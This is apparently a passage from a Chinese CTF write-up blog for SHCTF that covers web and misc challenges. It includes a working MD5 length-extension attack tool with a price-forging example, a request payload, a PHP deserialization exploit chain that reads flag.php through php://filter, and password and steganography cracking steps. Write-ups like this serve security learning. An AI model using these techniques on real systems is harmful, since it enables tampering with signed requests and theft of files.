class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> common.md5_manual <span class="keyword">import</span> md5_manual</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> common.crypto_utils <span class="keyword">import</span> CryptoUtils</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HashExtAttack</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    哈希长度扩展攻击,解决 hashpump 在win下使用困难的问题</span></span><br><span class="line"><span class="string">    目前仅支持md5，如果你对认证算法有了解可以手动改写str_add中的字符串拼接方式</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.know_text = <span class="string">b&quot;&quot;</span></span><br><span class="line">        self.know_text_padding = <span class="string">b&quot;&quot;</span></span><br><span class="line">        self.new_text = <span class="string">b&quot;&quot;</span></span><br><span class="line">        self.rand_str = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        self.know_hash = <span class="string">b&quot;3c5a36dd888251601d36bbc184648717&quot;</span></span><br><span class="line">        self.key_length = <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_padding_msg</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;填充明文&quot;&quot;&quot;</span></span><br><span class="line">        logger.debug(<span class="string">&quot;填充明文&quot;</span>)</span><br><span class="line">        self.know_text_padding = md5_manual.padding_str(self.know_text)</span><br><span class="line">        logger.debug(<span class="string">f&quot;已知明文填充：<span class="subst">&#123;self.know_text_padding&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gen_new_plain_text</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成新明文&quot;&quot;&quot;</span></span><br><span class="line">        self.new_text = self.know_text_padding + self.rand_str  <span class="comment"># b&#x27;80&#x27; + 55 * b&#x27;\x00&#x27; + struct.pack(&quot;&lt;Q&quot;, 512 + len(self.rand_str) *8)</span></span><br><span class="line">        logger.debug(<span class="string">f&quot;new_text: <span class="subst">&#123;self.new_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">split_hash</span>(<span class="params">self, hash_str: <span class="built_in">bytes</span></span>):</span><br><span class="line">        by_new = CryptoUtils.trans_str_origin2_bytes(hash_str.decode())</span><br><span class="line">        <span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;IIII&quot;</span>, by_new)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_guess_new_hash</span>(<span class="params">self</span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成新hash&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 第一步先生成新的字符串</span></span><br><span class="line">        <span class="comment"># 对已知明文进行填充</span></span><br><span class="line">        self._padding_msg()</span><br><span class="line">        <span class="comment"># 第二步 生成新明文</span></span><br><span class="line">        self._gen_new_plain_text()</span><br><span class="line">        <span class="comment"># 第三步 生成新hash(基于已知hash进行计算)</span></span><br><span class="line">        <span class="comment"># 3.1 hash拆分成4个分组</span></span><br><span class="line">        hash_block = self.split_hash(hash_str=self.know_hash)</span><br><span class="line">        md5_manual.A, md5_manual.B, md5_manual.C, md5_manual.D = hash_block</span><br><span class="line">        tmp_str = md5_manual.padding_str(self.new_text)</span><br><span class="line">        logger.debug(<span class="string">f&quot;新明文填充tmp_str(<span class="subst">&#123;<span class="built_in">len</span>(tmp_str)&#125;</span>): <span class="subst">&#123;tmp_str&#125;</span>&quot;</span>)</span><br><span class="line">        logger.debug(<span class="string">f&quot;参与手工分块计算的byte：<span class="subst">&#123;tmp_str[-<span class="number">64</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">        md5_manual.solve(tmp_str[-<span class="number">64</span>:])</span><br><span class="line">        self.new_hash = md5_manual.hex_digest()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.new_text, self.new_hash</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, know_text, know_hash, rand_str, key_len</span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="comment"># self.know_text = input(&quot;请输入已知明文：&quot;)</span></span><br><span class="line">        self.know_text = (<span class="string">&quot;*&quot;</span> * key_len + know_text).encode()  <span class="comment"># 密钥拼接</span></span><br><span class="line">        self.know_hash = know_hash.encode()</span><br><span class="line">        self.rand_str = rand_str.encode()</span><br><span class="line"></span><br><span class="line">        self._guess_new_hash()</span><br><span class="line">        logger.info(<span class="string">f&quot;已知明文：<span class="subst">&#123;self.know_text[key_len:]&#125;</span>&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;已知hash：<span class="subst">&#123;self.know_hash&#125;</span>&quot;</span>)</span><br><span class="line">        logger.debug(<span class="string">f&quot;任意填充：<span class="subst">&#123;self.rand_str&#125;</span>&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;新明文：<span class="subst">&#123;self.new_text[key_len:]&#125;</span>&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;新明文(url编码)：<span class="subst">&#123;urllib.parse.quote(self.new_text[key_len:], safe=<span class="string">&#x27;&amp;=&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># logger.debug(f&quot;新明文：&#123;base64.b64encode(self.new_text[key_len:])&#125;&quot;)</span></span><br><span class="line">        logger.info(<span class="string">f&quot;新hash:<span class="subst">&#123;self.new_hash&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.new_text[key_len:], self.new_hash</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">input_run</span>(<span class="params">self</span>):</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        self.run(<span class="built_in">input</span>(<span class="string">&quot;请输入已知明文：&quot;</span>), <span class="built_in">input</span>(<span class="string">&quot;请输入已知hash： &quot;</span>), <span class="built_in">input</span>(<span class="string">&quot;请输入扩展字符: &quot;</span>),</span><br><span class="line">                 <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入密钥长度：&quot;</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">self</span>):</span><br><span class="line">        self.run(</span><br><span class="line">            <span class="string">&quot;order_id=70&amp;buyer_id=17&amp;good_id=38&amp;buyer_point=300&amp;good_price=888&amp;order_create_time=1678236217.799935&quot;</span>,</span><br><span class="line">            <span class="string">&quot;178944d4a39e4e4af6522c6de6cb24c5&quot;</span>, <span class="string">&quot;&amp;good_price=1&quot;</span>, <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">hash_ext_attack = HashExtAttack()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    logger.remove()</span><br><span class="line">    logger.add(sys.stderr, level=<span class="string">&quot;INFO&quot;</span>)</span><br><span class="line">    hash_ext_attack.input_run()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/6GT3ewiB8AymEOQ.png" alt=""></p><p>明文也就是 $flag 我们不知道，直接给空</p><p>然后 hash 和长度都给 $flag 的，扩展字符随意</p><p><strong>payload：<br>Get:<br>url/?length=%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00abcd<br>POST:<br>SHCTF=738951256b789b8e5daef107b88a7a97</strong></p><p><img src="https://s2.loli.net/2024/03/08/nj7INtryALHGP8p.png" alt=""></p><h3 id="WEEK2-ez-ssti"><a href="#WEEK2-ez-ssti" class="headerlink" title="[WEEK2]ez_ssti"></a><strong>[WEEK2]ez_ssti</strong></h3><p><a href="https://blog.csdn.net/m0_56107268/article/details/127927582?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169709476616800197039314%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169709476616800197039314&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127927582-null-null.142%5Ev96%5Epc_search_result_base3&amp;utm_term=ssti%20ctf&amp;spm=1018.2226.3001.4187">SSTI(模板注入) 解析 和 ctf 做法_ctf flask 模板注入-CSDN 博客</a></p><p><img src="https://s2.loli.net/2024/03/08/sAZpExJoGfjc1RU.png" alt=""></p><h3 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a><strong>[WEEK2]serialize</strong></h3><p>正则绕过，_toString _wakeup _get 非法参数名 伪协议</p><p><a href="https://y4tacker.gitee.io/2021/02/03/year/2021/2%E6%9C%88/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP 反序列化</a></p><p><img src="https://s2.loli.net/2024/03/08/F3ZGBvHkSaWbgwy.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/ZNGklwrCd7zQcDi.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$misca</span> = <span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();</span><br><span class="line"><span class="variable">$musca</span>= <span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();</span><br><span class="line"><span class="variable">$milaoshu</span>=<span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();   <span class="comment">//创建对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$musca</span> -&gt;ding = <span class="variable">$misca</span>;          <span class="comment">//把对象misca给ding,在misca里没有$dong这个属性,触发_get</span></span><br><span class="line"><span class="variable">$misca</span> -&gt;gao = &amp;<span class="variable">$misca</span>-&gt;a;   <span class="comment">//把a的地址给gao，在方法_get里导致ding的值赋值给了$a</span></span><br><span class="line"><span class="variable">$misca</span> -&gt;fei = <span class="variable">$milaoshu</span>;        <span class="comment">//fei的值设置为对象milaoshu，由die()触发_toString</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$musca</span>));<span class="comment">//利用数组绕过正则匹配</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/hjplyRxV6rH2OBI.png" alt=""></p><h3 id="WEEK3-快问快答"><a href="#WEEK3-快问快答" class="headerlink" title="[WEEK3] 快问快答"></a>[WEEK3] 快问快答</h3><p>脚本编写</p><p>抓包看到是 post 传的答案</p><p><img src="https://s2.loli.net/2024/03/08/Eepo2nByTNGqdMQ.png" alt=""></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建会话</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://112.6.51.212:30842/&#x27;</span> <span class="comment">#url</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环答题</span></span><br><span class="line">correct_answers = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">70</span>):  <span class="comment"># 除法运算时有些报错，影响了循环，这里改70</span></span><br><span class="line">    <span class="comment"># 获取题目</span></span><br><span class="line">    r = s.get(url)</span><br><span class="line">    r.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    question_text = soup.find(<span class="string">&quot;h3&quot;</span>).text</span><br><span class="line">    <span class="built_in">print</span>(question_text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式从题目中提取数字和运算符</span></span><br><span class="line">    matches = re.<span class="keyword">match</span>(<span class="string">r&#x27;题目：(\d+) (异或|与|[+\-x÷]) (\d+) =&#x27;</span>, question_text)</span><br><span class="line">    <span class="comment"># 等待一秒</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> matches:</span><br><span class="line">        num1 = <span class="built_in">int</span>(matches.group(<span class="number">1</span>))</span><br><span class="line">        operator = matches.group(<span class="number">2</span>)</span><br><span class="line">        num2 = <span class="built_in">int</span>(matches.group(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            answer = num1 + num2</span><br><span class="line">        <span class="keyword">elif</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            answer = num1 - num2</span><br><span class="line">        <span class="keyword">elif</span> operator == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            answer = num1 * num2</span><br><span class="line">        <span class="keyword">elif</span> operator == <span class="string">&#x27;÷&#x27;</span>:</span><br><span class="line">            answer = num1 / num2</span><br><span class="line">        <span class="keyword">elif</span> operator == <span class="string">&#x27;异或&#x27;</span>:</span><br><span class="line">            answer = num1 ^ num2</span><br><span class="line">        <span class="keyword">elif</span> operator == <span class="string">&#x27;与&#x27;</span>:</span><br><span class="line">            answer = num1 &amp; num2</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 准备POST数据</span></span><br><span class="line">        data = &#123;<span class="string">&quot;answer&quot;</span>: answer&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送答案</span></span><br><span class="line">        response = s.post(url, data=data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;答案：<span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)  <span class="comment"># 输出对应的response.text</span></span><br></pre></td></tr></table></figure><blockquote><p>能用就行脚本 )<br><br></p></blockquote><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="WEEK1-签到题"><a href="#WEEK1-签到题" class="headerlink" title="[WEEK1]签到题"></a><strong>[WEEK1]签到题</strong></h3><p>base128</p><p><img src="https://s2.loli.net/2024/03/08/dbHXG1oW2BpwvTt.png" alt=""></p><p>如题，两个 64 解密即可</p><p><img src="https://s2.loli.net/2024/03/08/DBwMfm17dSnRThv.png" alt=""></p><p><strong>flag{this_is_flag}</strong></p><h3 id="WEEK1-也许需要一些-py"><a href="#WEEK1-也许需要一些-py" class="headerlink" title="[WEEK1]也许需要一些 py"></a><strong>[WEEK1]也许需要一些 py</strong></h3><p>   png 文件头，md5 爆破大小写字母</p><p><img src="https://s2.loli.net/2024/03/08/VfUCRs7MyG2Imgc.png" alt=""></p><p>打开 flag 文件是 png 结构,缺少文件头,补上即可</p><p><img src="https://s2.loli.net/2024/03/08/5KptClm9aLXuqSf.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/B8mcVb3tp4AeUWP.png" alt=""></p><p>加密后的 md5,暂时不管,还有个摩斯密码解密一下</p><p><img src="https://s2.loli.net/2024/03/08/35FTbmPUkNeB4pV.png" alt=""></p><p>结合描述</p><p><img src="https://s2.loli.net/2024/03/08/94BMJhgkqdw51rA.png" alt=""></p><p>THIS1SY0UKEY 转小写即可</p><p><img src="https://s2.loli.net/2024/03/08/L6XUQKYSntg3VBa.png" alt=""></p><p>这是 flag,但是大小写不是正确的,结合刚才得到的 md5 可以推测</p><p>md5 解密后对应的是正确大小写的 flag,但是 md5 只能加密不能解密</p><p>所以这里先把所有的大小写可能罗列,然后计算其 md5 值,并与我们的 md5 值进行比较</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标MD5哈希值</span></span><br><span class="line">MD5 = <span class="string">&quot;63e62fbce22f2757f99eb7da179551d2&quot;</span></span><br><span class="line"><span class="comment"># 已知的正确字母的字符串</span></span><br><span class="line">key = <span class="string">&quot;pNg_and_Md5_SO_GreaT&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归函数，生成所有可能的大小写组合</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_variants</span>(<span class="params">current_variant, index</span>):</span><br><span class="line">    <span class="keyword">if</span> index == <span class="built_in">len</span>(current_variant):</span><br><span class="line">        md5_hash = hashlib.md5(current_variant.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_hash == MD5:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到匹配的字符串: <span class="subst">&#123;current_variant&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    generate_variants(current_variant, index + <span class="number">1</span>)  <span class="comment"># 不更改当前字符的大小写</span></span><br><span class="line">    <span class="keyword">if</span> current_variant[index].isalpha():</span><br><span class="line">        new_variant = current_variant[:index] + current_variant[index].swapcase() + current_variant[index+<span class="number">1</span>:]</span><br><span class="line">        generate_variants(new_variant, index + <span class="number">1</span>)  <span class="comment"># 更改当前字符的大小写</span></span><br><span class="line"></span><br><span class="line">generate_variants(key, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/Ja8DMU3fY65KTEQ.png" alt=""></p><p><strong>flag{Png_AnD_md5_so_GReAt}</strong></p><h3 id="WEEK1-ez-misc"><a href="#WEEK1-ez-misc" class="headerlink" title="[WEEK1]ez-misc"></a><strong>[WEEK1]ez-misc</strong></h3><p>01 转二维码，rockyou 字典爆破，字频统计</p><p><img src="https://s2.loli.net/2024/03/08/Al3WJdbPUG8pnXD.png" alt=""></p><p>01 转二维码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">29</span> <span class="comment"># 先数出数字的比例，这题是29*29</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line"><span class="built_in">str</span> =<span class="string">&quot;xxx&quot;</span>                  <span class="comment">#放01文本进去</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line"><span class="comment">#pic.save(&quot;flag.png&quot;) 保存就使用这个，保存在当前目录</span></span><br></pre></td></tr></table></figure><p>微信扫码得到</p><p><img src="https://s2.loli.net/2024/03/08/8Z4qdJLeTDOXUIb.png" alt=""></p><p>hit_k1sme4_4_fun</p><p>拿这个密码解密加密文件得到</p><p><img src="https://s2.loli.net/2024/03/08/cX2mtWGoJ4B7uVK.png" alt=""></p><p>改后缀 zip 打开</p><p><img src="https://s2.loli.net/2024/03/08/FahQ4EpigYj3fWr.png" alt=""></p><p>解密下面的二进制码得到 rockyou</p><p><img src="https://s2.loli.net/2024/03/08/oOERWAGnw8tS5g2.png" alt=""></p><p>但 rockyou 不是 flag.txt 的解压密码，这里的意思是用 kali 自带的字典 rockyou.txt 进行字典爆破密码</p><p><a href="https://blog.csdn.net/weixin_44802617/article/details/126842861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169633779616777224469056%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169633779616777224469056&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-126842861-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=rockyou&amp;spm=1018.2226.3001.4187">Kali 自带密码字典 rockyou.txt 解压-CSDN 博客</a></p><p><img src="https://s2.loli.net/2024/03/08/AUEz7tVmN68X59v.png" alt=""></p><p>我这里运行不动不知道原因，就把字典拉到 win 的 ARCHPR 上用了</p><p><img src="https://s2.loli.net/2024/03/08/HalUuALBZ4F98gz.png" alt=""></p><p>密码：palomino</p><p><img src="https://s2.loli.net/2024/03/08/Bq6DgykUrSlWXY7.png" alt=""></p><p>字频统计</p><p><img src="https://s2.loli.net/2024/03/08/pmAbSVkHxe6J5MG.png" alt=""></p><p><strong>flag{SHyk1sme4}</strong></p><h3 id="WEEK1-Jaeger-lover"><a href="#WEEK1-Jaeger-lover" class="headerlink" title="[WEEK1]Jaeger lover"></a><strong>[WEEK1]Jaeger lover</strong></h3><p>搜索能力，oursecret 工具</p><p><img src="https://s2.loli.net/2024/03/08/rlSgD1VnRBh2Pey.png" alt=""></p><p>翻译：你知道环太平洋吗？</p><p>这里的标题 jaeger 是环太平洋里的机甲</p><p><img src="https://s2.loli.net/2024/03/08/Ad7ZHM8PJYuRxkU.png" alt=""></p><p>zip 里面是个加密的 png，Typhoon 的图片底部有 base 文本</p><p><img src="https://s2.loli.net/2024/03/08/iJGrj5twNXVUgZb.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/cHkodnba5YFjpR6.png" alt=""></p><blockquote><p>you know the Windows is a system for PC,but do you know the what is thr Op. System for this Jaeger？</p></blockquote><p>要我们找 jaeger 的操作系统，这里考察搜索能力，操作如下</p><p><img src="https://s2.loli.net/2024/03/08/Gt4RENpx2YLK1vf.png" alt=""></p><p><a href="https://pacificrim.fandom.com/wiki/Crimson_Typhoon_(Jaeger">https://pacificrim.fandom.com/wiki/Crimson<em>Typhoon</em>(Jaeger)</a>)</p><p><img src="https://s2.loli.net/2024/03/08/JGSHNxTEhfQtzug.png" alt=""></p><p>key：Tri-Sun Horizon Gate</p><p>但它不是压缩包的密码，根据题目描述，这张 Typhoon 还有一个操作没做</p><p>steghide 解密</p><p><img src="https://s2.loli.net/2024/03/08/73aIbqvgsMim84j.png" alt=""></p><p>.*+#1Ao/aeS  拿到这一串 key 解密 zip 文件</p><p>拿到图片</p><p><img src="https://s2.loli.net/2024/03/08/rk3VPRXeyKdwLID.png" alt=""></p><p>改宽高</p><p><img src="https://s2.loli.net/2024/03/08/kTwRXncBt4e9vSm.png" alt=""></p><p>K34-759183-191，现在只剩一步了，根据图片名字 secret</p><p>尝试 oursecret 解密，图片选择修复后的图片，密码：K34-759183-191</p><p><img src="https://s2.loli.net/2024/03/08/WehbkGrKfQ8TcPy.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/kjqP3yZsHEeTgpU.png" alt=""></p><p><strong>flag{A1l_boys_aRe_Jaeger_L0ver!!}</strong></p><h3 id="WEEK1-Steganography"><a href="#WEEK1-Steganography" class="headerlink" title="[WEEK1]Steganography"></a><strong>[WEEK1]Steganography</strong></h3><p>   exif 010editor</p><p><img src="https://s2.loli.net/2024/03/08/RBWSQrlyUsbdOwv.png" alt=""></p><p>第一张图 010 打开尾部解密 base64</p><p><img src="https://s2.loli.net/2024/03/08/D4Ezs1X8jbdOCcU.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/p3165egjUHrxLWZ.png" alt=""></p><p>12ercs…..909jk</p><p><img src="https://s2.loli.net/2024/03/08/CpJ3QekDjf4W5mX.png" alt=""></p><p>第二张图得到 xqwed，把它放入…..中</p><p>key：12ercsxqwed909jk</p><p>解压得到 flag</p><p><strong>flag{4d72e4f3-4d4f-4969-bc8c-a2f6f7a4292c}</strong></p><h3 id="WEEK1-可爱的派蒙捏"><a href="#WEEK1-可爱的派蒙捏" class="headerlink" title="[WEEK1]可爱的派蒙捏"></a><strong>[WEEK1]可爱的派蒙捏</strong></h3><p>binwalk，文本对比</p><p>拿到一张图片</p><p>binwalk 分离</p><p><img src="https://s2.loli.net/2024/03/08/qNpBDt7nmaicYUx.png" alt=""></p><p>两个文本非常相似，<a href="https://www.jq22.com/wbdb/">中文，代码文本比较</a></p><p><img src="https://s2.loli.net/2024/03/08/fy5TDk932J8NQHU.png" alt=""></p><p>一个一个打出来即可</p><p><strong>flag{4ebf327905288fca947a}</strong></p><h3 id="WEEK1-message"><a href="#WEEK1-message" class="headerlink" title="[WEEK1]message"></a><strong>[WEEK1]message</strong></h3><p>pdu 编码</p><p><img src="https://s2.loli.net/2024/03/08/LuxCXPi5JtZFpTR.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/e73DJBhLPVUr5dt.png" alt=""></p><p><a href="http://www.sendsms.cn/pdu/">PDU 编码解码工具</a></p><p><img src="https://s2.loli.net/2024/03/08/yZxp2UnWtwo9h3F.png" alt=""></p><p><strong>SHCTF{ba978405-b1c8-847c-8e69-f62177e4c087}</strong></p><h3 id="WEEK2-远在天边近在眼前"><a href="#WEEK2-远在天边近在眼前" class="headerlink" title="[WEEK2]远在天边近在眼前"></a><strong>[WEEK2]远在天边近在眼前</strong></h3><p>文件目录即为 flag</p><p><img 